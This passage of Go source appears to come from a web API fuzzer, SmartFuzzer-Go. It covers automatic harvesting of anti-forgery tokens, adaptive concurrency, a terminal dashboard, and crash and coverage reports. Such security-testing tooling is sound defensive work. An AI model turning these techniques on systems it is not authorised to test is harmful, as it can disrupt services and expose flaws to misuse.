		f.addEvent(fmt.Sprintf("HARVEST anti-forgery +%d  GET %s", learned, truncate(normalizePath(path), 60)))
	}
	return learned
}

func (f *Fuzzer) shouldHarvestAntiForgery(res SendResult) bool {
	if !f.cfg.AutoAntiForgery {
		return false
	}
	if !isWriteMethod(res.Item.Method) || isAPILikePath(res.Item.Path) {
		return false
	}
	ct := canonicalContentType(res.Item.Headers)
	if !isFormLikeContentType(ct) {
		return false
	}
	if res.Status != http.StatusBadRequest && res.Status != http.StatusForbidden {
		return false
	}
	if strings.TrimSpace(res.Body) == "" && res.Status == http.StatusBadRequest {
		return true
	}
	return isAntiForgeryFailure(res.Body)
}

func (f *Fuzzer) harvestAntiForgeryForPath(path string) int {
	norm, ok := f.reserveAntiForgeryHarvest(path)
	if !ok {
		return 0
	}
	return f.harvestAntiForgeryForPathReserved(norm)
}

func (f *Fuzzer) reserveAntiForgeryHarvest(path string) (string, bool) {
	if !f.cfg.AutoAntiForgery || !f.hasAuthContext() {
		return "", false
	}
	norm := normalizePath(path)
	if norm == "" {
		return "", false
	}
	now := time.Now()
	cooldown := time.Duration(math.Max(0.5, f.cfg.AntiForgeryCooldown) * float64(time.Second))
	f.harvestMu.Lock()
	last := f.antiForgeryHarvestAt[norm]
	if !last.IsZero() && now.Sub(last) < cooldown {
		f.harvestMu.Unlock()
		return "", false
	}
	f.antiForgeryHarvestAt[norm] = now
	f.harvestMu.Unlock()
	return norm, true
}

func (f *Fuzzer) harvestAntiForgeryForPathReserved(norm string) int {
	total := 0
	candidates := antiForgeryHarvestPaths(norm)
	for _, p := range candidates {
		req, err := http.NewRequest(http.MethodGet, f.target+p, nil)
		if err != nil {
			continue
		}
		for k, v := range f.authHeaders {
			if strings.EqualFold(k, "Host") || strings.EqualFold(k, "Content-Length") || strings.EqualFold(k, "Transfer-Encoding") {
				continue
			}
			req.Header.Set(k, v)
		}
		if f.token != "" {
			req.Header.Set("Authorization", "Bearer "+f.token)
		}
		resp, err := f.client.Do(req)
		if err != nil {
			continue
		}
		bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, int64(maxInt(16*1024, f.cfg.MaxResponseBytes))))
		_ = resp.Body.Close()
		body := sanitizeText(string(bodyBytes), maxInt(16*1024, f.cfg.MaxResponseBytes))
		respHeaders := map[string]string{}
		for k, vals := range resp.Header {
			if len(vals) > 0 {
				respHeaders[k] = vals[0]
			}
		}
		learned := f.learnAntiForgeryFromResponse(p, resp.StatusCode, respHeaders, body, true)
		total += learned
		if learned > 0 {
			break
		}
	}
	return total
}

func (f *Fuzzer) shouldLearnFromSuccess(res SendResult) bool {
	f.learnSampleCounter++
	method := res.Item.Method
	if method == "POST" || method == "PUT" || method == "PATCH" || method == "DELETE" {
		return true
	}
	if loc := strings.TrimSpace(res.Headers["Location"]); loc != "" {
		return true
	}
	if loc := strings.TrimSpace(res.Headers["location"]); loc != "" {
		return true
	}
	if res.Item.EpochName == "Harvest" || res.Item.EpochName == "Baseline" || res.Item.EpochName == "Sequence" {
		return true
	}
	if len(res.Body) == 0 || len(res.Body) > 64*1024 {
		return false
	}
	if !reJSONStartAny.MatchString(res.Body) {
		return false
	}
	return f.learnSampleCounter%3 == 0
}

func (f *Fuzzer) shouldEnqueueSequence(res SendResult, learned int) bool {
	method := res.Item.Method
	if method == "POST" || method == "PUT" || method == "PATCH" {
		return true
	}
	if learned > 0 {
		return true
	}
	// Light sampling on non-write successes to avoid expensive parsing each time.
	return f.learnSampleCounter%5 == 0
}

func (f *Fuzzer) addEvent(text string) {
	msg := strings.TrimSpace(sanitizeText(text, 320))
	if msg == "" {
		return
	}
	elapsed := time.Since(f.startTime)
	totalSec := int(elapsed.Seconds())
	stamp := fmt.Sprintf("[%02d:%02d]", (totalSec/60)%60, totalSec%60)
	line := stamp + " " + msg
	if len(f.eventLog) > 0 && f.eventLog[0] == line {
		return
	}
	f.eventLog = append([]string{line}, f.eventLog...)
	if len(f.eventLog) > 6 {
		f.eventLog = f.eventLog[:6]
	}
}

func (f *Fuzzer) maybeAddRequestSample(res SendResult) {
	if res.Err != nil {
		return
	}
	interesting := res.Status >= 500 ||
		strings.Contains(res.Item.MutationLabel, "dict_") ||
		strings.Contains(res.Item.MutationLabel, "dep_") ||
		strings.Contains(res.Item.MutationLabel, "path_") ||
		strings.Contains(res.Item.MutationLabel, "adapt_form")
	if !interesting && rand.Float64() > 0.01 {
		return
	}
	now := time.Now()
	if !f.lastValueSampleTS.IsZero() && now.Sub(f.lastValueSampleTS) < 250*time.Millisecond && !interesting {
		return
	}
	payload := compactPayloadForUI(res.Item.Body, 68)
	if payload == "" {
		payload = "<empty>"
	}
	line := fmt.Sprintf("%-5s %-34s %3d  %s", res.Item.Method, truncate(normalizePath(res.Item.Path), 34), res.Status, payload)
	f.requestSamples = append([]string{sanitizeText(line, 240)}, f.requestSamples...)
	if len(f.requestSamples) > 6 {
		f.requestSamples = f.requestSamples[:6]
	}
	f.lastValueSampleTS = now
}

func (f *Fuzzer) tuneConcurrency() {
	if !f.cfg.AdaptiveConcurrency {
		return
	}
	now := time.Now()
	if now.Sub(f.lastTuneTS) < 1*time.Second {
		return
	}
	dt := now.Sub(f.lastTuneTS).Seconds()
	doneDelta := f.totalDone - f.lastTuneDone
	errDelta := f.totalErrors - f.lastTuneErr
	latDelta := f.latencyTotalMS - f.lastTuneLatMS

	doneRate := float64(doneDelta) / math.Max(0.001, dt)
	errRate := float64(errDelta) / math.Max(1.0, float64(doneDelta+errDelta))
	avgLat := 0.0
	if doneDelta > 0 {
		avgLat = latDelta / float64(doneDelta)
	}

	if avgLat > 0 {
		if f.baselineLatMS == 0 {
			f.baselineLatMS = avgLat
		} else {
			f.baselineLatMS = f.baselineLatMS*0.95 + avgLat*0.05
		}
	}
	highLat := math.Max(400.0, f.baselineLatMS*3.0)
	medLat := math.Max(200.0, f.baselineLatMS*2.0)
	growLat := math.Max(150.0, f.baselineLatMS*1.3)

	prev := f.currentConcurrency
	if errRate > 0.15 || avgLat > highLat {
		f.currentConcurrency = maxInt(f.cfg.MinConcurrency, f.currentConcurrency-2)
	} else if avgLat > medLat {
		f.currentConcurrency = maxInt(f.cfg.MinConcurrency, f.currentConcurrency-1)
	} else if doneRate > float64(f.currentConcurrency)*0.75 && avgLat < growLat && errRate < 0.05 {
		f.currentConcurrency = minInt(f.cfg.MaxConcurrency, f.currentConcurrency+1)
	}
	if prev != f.currentConcurrency {
		msg := fmt.Sprintf("concurrency %d -> %d (done=%.1f/s err=%.2f lat=%.1fms)", prev, f.currentConcurrency, doneRate, errRate, avgLat)
		f.addEvent("[ADAPT] " + msg)
		if !f.cfg.NoUI && !f.useDashboardUI() {
			fmt.Printf("[ADAPT] %s\n", msg)
		}
	}

	f.lastTuneTS = now
	f.lastTuneDone = f.totalDone
	f.lastTuneErr = f.totalErrors
	f.lastTuneLatMS = f.latencyTotalMS

	// MOpt: recalculate mutation category weights every tuning cycle.
	updateMutationCategoryWeights()
}

func (f *Fuzzer) useDashboardUI() bool {
	if f.cfg.NoUI || f.cfg.PlainUI {
		return false
	}
	return f.uiInline || f.cfg.ForceUI
}

func (f *Fuzzer) dashboardWidth() int {
	if f.uiWidthLocked > 0 {
		return f.uiWidthLocked
	}
	w := 0
	if f.cfg.UIWidth > 0 {
		w = f.cfg.UIWidth
	}
	if w == 0 {
		if ev := strings.TrimSpace(os.Getenv("SMART_FUZZER_UI_WIDTH")); ev != "" {
			if v, err := strconv.Atoi(ev); err == nil {
				w = v
			}
		}
	}
	if w == 0 {
		if ev := strings.TrimSpace(os.Getenv("COLUMNS")); ev != "" {
			if v, err := strconv.Atoi(ev); err == nil {
				w = v
			}
		}
	}
	if w == 0 {
		w = 120
	}
	f.uiWidthLocked = clampInt(w, 80, 200)
	return f.uiWidthLocked
}

func (f *Fuzzer) dashboardHeightHint() int {
	if ev := strings.TrimSpace(os.Getenv("LINES")); ev != "" {
		if v, err := strconv.Atoi(ev); err == nil {
			return clampInt(v, 20, 120)
		}
	}
	return 44
}

func (f *Fuzzer) clearDashboard() {
	if f.cfg.UINoClear {
		return
	}
	fmt.Print("\033[H\033[2J")
}

func dashProgressBar(frac float64, width int, ascii bool) string {
	frac = clampFloat(frac, 0.0, 1.0)
	filled := int(frac * float64(width))
	if ascii {
		return strings.Repeat("#", filled) + strings.Repeat("-", maxInt(0, width-filled))
	}
	return strings.Repeat("█", filled) + strings.Repeat("░", maxInt(0, width-filled))
}

func dashTruncate(s string, maxLen int) string {
	if maxLen <= 0 {
		return ""
	}
	s = sanitizeText(s, maxInt(8, maxLen*2))
	rs := []rune(s)
	if len(rs) <= maxLen {
		return s
	}
	if maxLen <= 2 {
		return string(rs[:maxLen])
	}
	return string(rs[:maxLen-2]) + ".."
}

func dashTopBorder(width int, ascii bool) string {
	if ascii {
		return "+" + strings.Repeat("-", maxInt(0, width-2)) + "+"
	}
	return "┌" + strings.Repeat("─", maxInt(0, width-2)) + "┐"
}

func dashBottomBorder(width int, ascii bool) string {
	if ascii {
		return "+" + strings.Repeat("-", maxInt(0, width-2)) + "+"
	}
	return "└" + strings.Repeat("─", maxInt(0, width-2)) + "┘"
}

func dashHLine(width int, ascii bool) string {
	if ascii {
		return "+" + strings.Repeat("-", maxInt(0, width-2)) + "+"
	}
	return "├" + strings.Repeat("─", maxInt(0, width-2)) + "┤"
}

func dashRow(content string, width int, ascii bool) string {
	content = sanitizeText(content, 4000)
	inner := maxInt(0, width-3)
	content = dashTruncate(content, inner)
	visible := len([]rune(content))
	pad := maxInt(0, inner-visible)
	if ascii {
		return "| " + content + strings.Repeat(" ", pad) + "|"
	}
	return "│ " + content + strings.Repeat(" ", pad) + "│"
}

func formatMMSS(seconds float64) string {
	if seconds < 0 {
		seconds = 0
	}
	total := int(seconds)
	hh := total / 3600
	mm := (total % 3600) / 60
	ss := total % 60
	if hh > 0 {
		return fmt.Sprintf("%02d:%02d:%02d", hh, mm, ss)
	}
	return fmt.Sprintf("%02d:%02d", mm, ss)
}

func sortEndpointsForUI(eps []*EndpointStats, mode string) {
	m := strings.ToLower(strings.TrimSpace(mode))
	sort.Slice(eps, func(i, j int) bool {
		a := eps[i]
		b := eps[j]
		switch m {
		case "req", "requests":
			if a.Reqs != b.Reqs {
				return a.Reqs > b.Reqs
			}
			if a.NewEdges != b.NewEdges {
				return a.NewEdges > b.NewEdges
			}
		case "edge", "edges", "coverage":
			if a.NewEdges != b.NewEdges {
				return a.NewEdges > b.NewEdges
			}
			if a.Reqs != b.Reqs {
				return a.Reqs > b.Reqs
			}
		case "recent", "last":
			if a.LastSeen != b.LastSeen {
				return a.LastSeen > b.LastSeen
			}
			if a.Reqs != b.Reqs {
				return a.Reqs > b.Reqs
			}
		case "alpha", "path":
			ak := endpointKey(a.Method, a.Path)
			bk := endpointKey(b.Method, b.Path)
			return ak < bk
		default:
			// "hot": prioritize crashy/hot endpoints.
			if a.S500 != b.S500 {
				return a.S500 > b.S500
			}
			if a.S5xx != b.S5xx {
				return a.S5xx > b.S5xx
			}
			if a.Reqs != b.Reqs {
				return a.Reqs > b.Reqs
			}
			if a.NewEdges != b.NewEdges {
				return a.NewEdges > b.NewEdges
			}
		}
		return endpointKey(a.Method, a.Path) < endpointKey(b.Method, b.Path)
	})
}

func (f *Fuzzer) renderUI(epochName string, epochIdx int, inFlight int) {
	if f.cfg.NoUI {
		return
	}
	now := time.Now()
	if !f.lastUIRender.IsZero() && now.Sub(f.lastUIRender) < time.Duration(f.cfg.UIIntervalSec*float64(time.Second)) {
		return
	}
	elapsed := now.Sub(f.startTime).Seconds()
	doneRate := 0.0
	sentRate := 0.0
	if elapsed > 0 {
		doneRate = float64(f.totalDone) / elapsed
		sentRate = float64(f.totalSent) / elapsed
	}
	avgLat := 0.0
	if f.latencySamples > 0 {
		avgLat = f.latencyTotalMS / float64(f.latencySamples)
	}

	satSuffix := ""
	if f.coverageCapacity > 0 {
		satSuffix = fmt.Sprintf(" sat=%.1f%%", f.coverageSaturationPct())
	}
	if !f.useDashboardUI() {
		fmt.Printf("[UI] t=%6.1fs epoch=%-13s edges=%d(+%d)%s done=%.1f sent=%.1f req/s lat=%.1fms in_flight=%d conc=%d corpus=%d crashes=%d uniq=%d err=%d\n",
			elapsed,
			epochName,
			f.currentEdges,
			f.currentEdges-f.startEdges,
			satSuffix,
			doneRate,
			sentRate,
			avgLat,
			inFlight,
			f.currentConcurrency,
			len(f.corpus),
			f.totalCrashes,
			f.uniqueCrashes,
			f.totalErrors,
		)
		f.lastUIRender = now
		return
	}

	width := f.dashboardWidth()
	height := f.dashboardHeightHint()
	pathColWidth := maxInt(20, width-62)
	mutColWidth := maxInt(20, width-52)
	maxCrashRows := 5
	maxMutRows := 6
	maxSampleRows := 4
	maxEventRows := 4
	if height < 52 {
		maxCrashRows = 4
		maxMutRows = 4
		maxSampleRows = 3
		maxEventRows = 3
	}
	if height < 44 {
		maxCrashRows = 3
		maxMutRows = 2
		maxSampleRows = 2
		maxEventRows = 2
	}
	if height < 38 {
		maxCrashRows = 2
		maxMutRows = 1
		maxSampleRows = 1
		maxEventRows = 2
	}
	maxEndpoints := clampInt(height-(25+maxCrashRows+maxMutRows+maxSampleRows+maxEventRows), 4, 40)
	frac := 0.0
	timeBudgetSecs := f.cfg.TimeBudgetMinutes * 60.0
	if timeBudgetSecs > 0 {
		frac = elapsed / timeBudgetSecs
	}
	elapsedStr := formatMMSS(elapsed)
	budgetStr := formatMMSS(timeBudgetSecs)
	eps := make([]*EndpointStats, 0, len(f.endpointStats))
	for _, ep := range f.endpointStats {
		eps = append(eps, ep)
	}
	sortEndpointsForUI(eps, f.cfg.UIEndpointSort)
	totalEndpoints := len(eps)
	totalPages := 0
	pageIdx := 0
	pageStart := 0
	pageEnd := 0
	if maxEndpoints > 0 {
		totalPages = (totalEndpoints + maxEndpoints - 1) / maxEndpoints
	}
	if totalPages > 0 {
		if f.cfg.UIEndpointRotate {
			rotateEvery := math.Max(0.5, f.cfg.UIEndpointRotateSec)
			pageIdx = int(elapsed/rotateEvery) % totalPages
		}
		pageStart = pageIdx * maxEndpoints
		pageEnd = minInt(pageStart+maxEndpoints, totalEndpoints)
		eps = eps[pageStart:pageEnd]
	}
	crashEps := make([]*EndpointStats, 0, len(f.endpointStats))
	for _, ep := range f.endpointStats {
		if ep.Logged500 > 0 {
			crashEps = append(crashEps, ep)
		}
	}
	sort.Slice(crashEps, func(i, j int) bool {
		if crashEps[i].Logged500 != crashEps[j].Logged500 {
			return crashEps[i].Logged500 > crashEps[j].Logged500
		}
		if crashEps[i].Logged5xx != crashEps[j].Logged5xx {
			return crashEps[i].Logged5xx > crashEps[j].Logged5xx
		}
		if crashEps[i].Reqs != crashEps[j].Reqs {
			return crashEps[i].Reqs > crashEps[j].Reqs
		}
		return endpointKey(crashEps[i].Method, crashEps[i].Path) < endpointKey(crashEps[j].Method, crashEps[j].Path)
	})

	muts := make([]*MutationStats, 0, len(f.mutationStats))
	for _, ms := range f.mutationStats {
		muts = append(muts, ms)
	}
	sort.Slice(muts, func(i, j int) bool {
		if muts[i].NewEdges == muts[j].NewEdges {
			return muts[i].Attempts > muts[j].Attempts
		}
		return muts[i].NewEdges > muts[j].NewEdges
	})

	lines := make([]string, 0, 96)
	lines = append(lines, dashTopBorder(width, f.cfg.ASCIIUI))
	title := fmt.Sprintf(" SmartFuzzer-Go ── %s ── stop: type 'stop' + Enter / Ctrl+C ", sanitizeText(f.target, 120))
	lines = append(lines, dashRow(title, width, f.cfg.ASCIIUI))
	lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))
	bar := dashProgressBar(frac, 28, f.cfg.ASCIIUI)
	lines = append(lines, dashRow(fmt.Sprintf("  TIME  %s %s / %s      EPOCH %d: %s", bar, elapsedStr, budgetStr, epochIdx+1, epochName), width, f.cfg.ASCIIUI))
	lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))

	lines = append(lines, dashRow(
		fmt.Sprintf(
			"  COVERAGE %d edges (+%d new)%s    SPEED done:%.1f sent:%.1f req/s    CORPUS %d seeds",
			f.currentEdges, f.currentEdges-f.startEdges, satSuffix, doneRate, sentRate, len(f.corpus),
		),
		width,
		f.cfg.ASCIIUI,
	))
	lines = append(lines, dashRow(
		fmt.Sprintf("  LATENCY %.1f ms(avg)    IN-FLIGHT %d", avgLat, inFlight),
		width,
		f.cfg.ASCIIUI,
	))
	lines = append(lines, dashRow(
		fmt.Sprintf("  REQUESTS %d total       CRASHES %d (%d uniq)    ERRORS %d", f.totalDone, f.totalCrashes, f.uniqueCrashes, f.totalErrors),
		width,
		f.cfg.ASCIIUI,
	))
	lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))

	lines = append(lines, dashHLine(width, f.cfg.ASCIIUI))
	endpointHeader := fmt.Sprintf("  %-*s %6s %6s %6s %6s %6s %6s %7s", pathColWidth+6, "ENDPOINT", "reqs", "2xx", "401/3", "4xx", "500", "5xx", "edges")
	sortLabel := strings.ToLower(strings.TrimSpace(f.cfg.UIEndpointSort))
	if sortLabel == "" {
		sortLabel = "hot"
	}
	pageLabel := "1/1"
	if totalPages > 0 {
		pageLabel = fmt.Sprintf("%d/%d", pageIdx+1, totalPages)
	}
	viewFrom := 0
	viewTo := 0
	if totalEndpoints > 0 {
		viewFrom = pageStart + 1
		viewTo = maxInt(pageStart, pageEnd)
	}
	lines = append(lines, dashRow(
		fmt.Sprintf("  ENDPOINT VIEW  sort=%s  page=%s  rows=%d-%d/%d  rotate=%v(%.1fs)",
			sortLabel, pageLabel, viewFrom, viewTo, totalEndpoints, f.cfg.UIEndpointRotate, f.cfg.UIEndpointRotateSec),
		width,
		f.cfg.ASCIIUI,
	))
	lines = append(lines, dashRow(
		endpointHeader,
		width,
		f.cfg.ASCIIUI,
	))
	for i := 0; i < maxEndpoints; i++ {
		if i < len(eps) {
			ep := eps[i]
			pathDisp := dashTruncate(ep.Path, pathColWidth)
			label := fmt.Sprintf("  %-5s %-*s", ep.Method, pathColWidth, pathDisp)
			lines = append(lines, dashRow(
				fmt.Sprintf("%s %6d %6d %6d %6d %6d %6d +%5d", label, ep.Reqs, ep.S2xx, ep.S401403, ep.S4xx, ep.S500, ep.S5xx, ep.NewEdges),
				width,
				f.cfg.ASCIIUI,
			))
		} else {
			lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))
		}
	}
	lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))

	lines = append(lines, dashHLine(width, f.cfg.ASCIIUI))
	lines = append(lines, dashRow(
		fmt.Sprintf("  %-*s %6s %6s %6s", pathColWidth+6, "ENDPOINTS WITH LOGGED 500", "reqs", "500", "5xx"),
		width,
		f.cfg.ASCIIUI,
	))
	for i := 0; i < maxCrashRows; i++ {
		if i < len(crashEps) {
			ep := crashEps[i]
			pathDisp := dashTruncate(ep.Path, pathColWidth)
			label := fmt.Sprintf("  %-5s %-*s", ep.Method, pathColWidth, pathDisp)
			lines = append(lines, dashRow(
				fmt.Sprintf("%s %6d %6d %6d", label, ep.Reqs, ep.Logged500, ep.Logged5xx),
				width,
				f.cfg.ASCIIUI,
			))
		} else {
			lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))
		}
	}
	lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))

	lines = append(lines, dashHLine(width, f.cfg.ASCIIUI))
	lines = append(lines, dashRow(
		fmt.Sprintf("  %-*s %6s %7s %7s", mutColWidth+2, "MUTATION", "hits", "edges", "eff%"),
		width,
		f.cfg.ASCIIUI,
	))
	for i := 0; i < maxMutRows; i++ {
		if i < len(muts) {
			ms := muts[i]
			nameDisp := dashTruncate(ms.Name, mutColWidth)
			eff := 0.0
			if ms.Attempts > 0 {
				eff = float64(ms.NewEdges) / float64(ms.Attempts) * 100.0
			}
			lines = append(lines, dashRow(
				fmt.Sprintf("  %-*s %6d +%5d %6.1f%%", mutColWidth, nameDisp, ms.Attempts, ms.NewEdges, eff),
				width,
				f.cfg.ASCIIUI,
			))
		} else {
			lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))
		}
	}
	lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))

	lines = append(lines, dashHLine(width, f.cfg.ASCIIUI))
	lines = append(lines, dashRow("  RECENT REQUEST VALUES", width, f.cfg.ASCIIUI))
	for i := 0; i < maxSampleRows; i++ {
		if i < len(f.requestSamples) {
			lines = append(lines, dashRow("  "+dashTruncate(f.requestSamples[i], width-6), width, f.cfg.ASCIIUI))
		} else {
			lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))
		}
	}
	lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))

	lines = append(lines, dashHLine(width, f.cfg.ASCIIUI))
	lines = append(lines, dashRow("  RECENT EVENTS", width, f.cfg.ASCIIUI))
	for i := 0; i < maxEventRows; i++ {
		if i < len(f.eventLog) {
			lines = append(lines, dashRow("  "+dashTruncate(f.eventLog[i], width-6), width, f.cfg.ASCIIUI))
		} else {
			lines = append(lines, dashRow("", width, f.cfg.ASCIIUI))
		}
	}
	lines = append(lines, dashBottomBorder(width, f.cfg.ASCIIUI))

	f.clearDashboard()
	fmt.Print(strings.Join(lines, "\n"))
	if !strings.HasSuffix(lines[len(lines)-1], "\n") {
		fmt.Print("\n")
	}
	f.lastUIRender = now
}

func (f *Fuzzer) printFinalReport() {
	if f.stoppedByUser {
		fmt.Printf("\n\nFuzzing stopped by user.\n")
	} else {
		fmt.Printf("\n\nFuzzing complete.\n")
	}
	elapsed := time.Since(f.startTime).Seconds()
	doneRate := 0.0
	sentRate := 0.0
	avgLat := 0.0
	if elapsed > 0 {
		doneRate = float64(f.totalDone) / elapsed
		sentRate = float64(f.totalSent) / elapsed
	}
	if f.latencySamples > 0 {
		avgLat = f.latencyTotalMS / float64(f.latencySamples)
	}
	fmt.Printf("Requests done=%d sent=%d done/s=%.1f sent/s=%.1f\n", f.totalDone, f.totalSent, doneRate, sentRate)
	if f.coverageCapacity > 0 {
		fmt.Printf("Coverage: %d -> %d (+%d) [sat=%.1f%% of %d]\n", f.startEdges, f.currentEdges, f.currentEdges-f.startEdges, f.coverageSaturationPct(), f.coverageCapacity)
	} else {
		fmt.Printf("Coverage: %d -> %d (+%d)\n", f.startEdges, f.currentEdges, f.currentEdges-f.startEdges)
	}
	fmt.Printf("Latency avg=%.1fms errors=%d crashes=%d uniq=%d\n", avgLat, f.totalErrors, f.totalCrashes, f.uniqueCrashes)
	if f.cfg.AutoAntiForgery {
		fmt.Printf("Anti-forgery tokens learned=%d pool=%d\n", f.antiForgeryLearned, f.antiForgeryTokenPoolSize())
	}

	type epRow struct {
		Key string
		S   *EndpointStats
	}
	rows := make([]epRow, 0, len(f.endpointStats))
	for k, v := range f.endpointStats {
		rows = append(rows, epRow{k, v})
	}
	sort.Slice(rows, func(i, j int) bool {
		if rows[i].S.S500 != rows[j].S.S500 {
			return rows[i].S.S500 > rows[j].S.S500
		}
		if rows[i].S.S5xx != rows[j].S.S5xx {
			return rows[i].S.S5xx > rows[j].S.S5xx
		}
		if rows[i].S.Reqs != rows[j].S.Reqs {
			return rows[i].S.Reqs > rows[j].S.Reqs
		}
		if rows[i].S.NewEdges != rows[j].S.NewEdges {
			return rows[i].S.NewEdges > rows[j].S.NewEdges
		}
		return rows[i].Key < rows[j].Key
	})
	fmt.Printf("Top endpoints:\n")
	for i := 0; i < minInt(12, len(rows)); i++ {
		r := rows[i].S
		fmt.Printf("  %-5s %-46s req=%5d 2xx=%4d 401/3=%4d 4xx=%4d 500=%4d 5xx=%4d edges=+%d\n",
			r.Method, truncate(r.Path, 46), r.Reqs, r.S2xx, r.S401403, r.S4xx, r.S500, r.S5xx, r.NewEdges)
	}
	fmt.Printf("Endpoints with logged 500:\n")
	count500 := 0
	for _, row := range rows {
		if row.S.Logged500 <= 0 {
			continue
		}
		r := row.S
		fmt.Printf("  %-5s %-46s req=%5d 500=%4d 5xx=%4d\n",
			r.Method, truncate(r.Path, 46), r.Reqs, r.Logged500, r.Logged5xx)
		count500++
	}
	if count500 == 0 {
		fmt.Printf("  <none>\n")
	}
	blockedEndpoints := mapKeys(f.blockedEndpoints)
	sort.Strings(blockedEndpoints)
	endpoints500 := make([]map[string]any, 0, 16)
	endpoints500Observed := make([]map[string]any, 0, 16)
	filtered500Total := 0
	logged500Total := 0
	for _, row := range rows {
		if row.S.S500 > 0 {
			endpoints500Observed = append(endpoints500Observed, map[string]any{
				"method":       row.S.Method,
				"path":         row.S.Path,
				"reqs":         row.S.Reqs,
				"500":          row.S.S500,
				"5xx":          row.S.S5xx,
				"logged_500":   row.S.Logged500,
				"logged_5xx":   row.S.Logged5xx,
				"filtered_500": row.S.Filtered500,
				"filtered_5xx": row.S.Filtered5xx,
			})
			filtered500Total += row.S.Filtered500
			logged500Total += row.S.Logged500
		}
		if row.S.Logged500 <= 0 {
			continue
		}
		endpoints500 = append(endpoints500, map[string]any{
			"method": row.S.Method,
			"path":   row.S.Path,
			"reqs":   row.S.Reqs,
			"500":    row.S.Logged500,
			"5xx":    row.S.Logged5xx,
		})
		if len(endpoints500) >= 64 {
			break
		}
	}
	if len(endpoints500Observed) > 64 {
		endpoints500Observed = endpoints500Observed[:64]
	}
	triageSummary, topFindings := f.findingsReportData()
	if len(topFindings) > 0 {
		fmt.Printf("Top triaged findings:\n")
		for i := 0; i < minInt(8, len(topFindings)); i++ {
			tf := topFindings[i]
			score := toInt(tf["severity_score"])
			classification := toString(tf["classification"])
			stability := toString(tf["repro_stability"])
			fmt.Printf("  #%d [%d] %-12s %s %s (%s)\n", i+1, score, truncate(classification, 12), toString(tf["method"]), truncate(toString(tf["path"]), 52), stability)
		}
	}

	summary := map[string]any{
		"timestamp":                   time.Now().Format(time.RFC3339),
		"target_host":                 f.target,
		"elapsed_secs":                elapsed,
		"requests_done":               f.totalDone,
		"requests_sent":               f.totalSent,
		"done_req_per_sec":            doneRate,
		"sent_req_per_sec":            sentRate,
		"avg_latency_ms":              avgLat,
		"antiforgery_tokens_learned":  f.antiForgeryLearned,
		"antiforgery_token_pool_size": f.antiForgeryTokenPoolSize(),
		"errors":                      f.totalErrors,
		"crashes_total":               f.totalCrashes,
		"crashes_unique":              f.uniqueCrashes,
		"coverage_start_edges":        f.startEdges,
		"coverage_end_edges":          f.currentEdges,
		"coverage_new_edges":          f.currentEdges - f.startEdges,
		"coverage_capacity":           f.coverageCapacity,
		"coverage_saturation_pct":     f.coverageSaturationPct(),
		"corpus_size":                 len(f.corpus),
		"stopped_by_user":             f.stoppedByUser,
		"sequence_prob":               f.cfg.SequenceProb,
		"sequence_max_depth":          f.cfg.SequenceMaxDepth,
		"sequence_fanout":             f.cfg.SequenceFanout,
		"crash_log_file":              f.cfg.CrashFile,
		"unique_crash_log_file":       f.cfg.UniqueCrashFile,
		"structured_report_file":      f.cfg.ReportFile,
		"endpoints_500":               endpoints500,
		"endpoints_500_observed":      endpoints500Observed,
		"logged_500_total":            logged500Total,
		"filtered_500_total":          filtered500Total,
		"blocked_endpoints_500":       blockedEndpoints,
		"auth_blocked_endpoints":      f.authBlocked,
		"client_error_samples":        f.clientSamples,
		"request_value_samples":       f.requestSamples,
		"triage_summary":              triageSummary,
		"top_findings":                topFindings,
	}
	_ = os.MkdirAll(filepath.Dir(f.cfg.SummaryFile), 0o755)
	if b, err := json.MarshalIndent(summary, "", "  "); err == nil {
		_ = os.WriteFile(f.cfg.SummaryFile, append(b, '\n'), 0o644)
	}
	report := f.buildStructuredCrashReport(triageSummary)
	_ = os.MkdirAll(filepath.Dir(f.cfg.ReportFile), 0o755)
	if b, err := json.MarshalIndent(report, "", "  "); err == nil {
		_ = os.WriteFile(f.cfg.ReportFile, append(b, '\n'), 0o644)
	}
	fmt.Printf("Crash log file: %s\n", f.cfg.CrashFile)
	fmt.Printf("Unique crash file: %s\n", f.cfg.UniqueCrashFile)
	fmt.Printf("Summary file: %s\n", f.cfg.SummaryFile)
	fmt.Printf("Report file: %s\n", f.cfg.ReportFile)
}

func (f *Fuzzer) pickWeightedTemplate() int {
	if len(f.activeIDs) == 0 {
		return -1
	}
	weights := make([]float64, 0, len(f.activeIDs))
	tids := make([]int, 0, len(f.activeIDs))
	for _, tid := range f.activeIDs {
		w := f.templateHealthWeight(tid) * f.templateDependencyWeight(tid) * f.templateSourcePriorityWeight(tid)
		weights = append(weights, math.Max(0.03, w))
		tids = append(tids, tid)
	}
	idx := weightedPick(weights)
	if idx < 0 || idx >= len(tids) {
		return tids[rand.Intn(len(tids))]
	}
	return tids[idx]
}

func (f *Fuzzer) pickHarvestTemplate() int {
	if len(f.activeIDs) == 0 {
		return -1
	}
	weights := make([]float64, 0, len(f.activeIDs))
	for _, tid := range f.activeIDs {
		meta := f.meta[tid]
		w := 1.0
		hasPathParams := strings.Contains(meta.Norm, "{") && strings.Contains(meta.Norm, "}")
		switch meta.Method {
		case "POST":
			w *= 7.0
		case "PUT", "PATCH":
			w *= 4.0
		case "GET":
			if hasPathParams {
				w *= 1.2
			} else {
				w *= 3.0
			}
		case "DELETE":
			w *= 0.6
		}
		k := endpointKey(meta.Method, meta.Norm)
		w *= 1.0 + math.Min(2.5, float64(f.learnedByEndpoint[k])*0.15)
		w *= f.templateHealthWeight(tid)
		w *= f.templateDependencyWeight(tid)
		w *= f.templateSourcePriorityWeight(tid)
		weights = append(weights, math.Max(0.05, w))
	}
	idx := weightedPick(weights)
	if idx < 0 || idx >= len(f.activeIDs) {
		return f.activeIDs[rand.Intn(len(f.activeIDs))]
	}
	return f.activeIDs[idx]
}

func (f *Fuzzer) pickSeed() int {
	if len(f.corpus) == 0 {
		return -1
	}
	idx := f.seedSampler.Pick()
	if idx < 0 || idx >= len(f.corpus) {
		return rand.Intn(len(f.corpus))
	}
	return idx
}

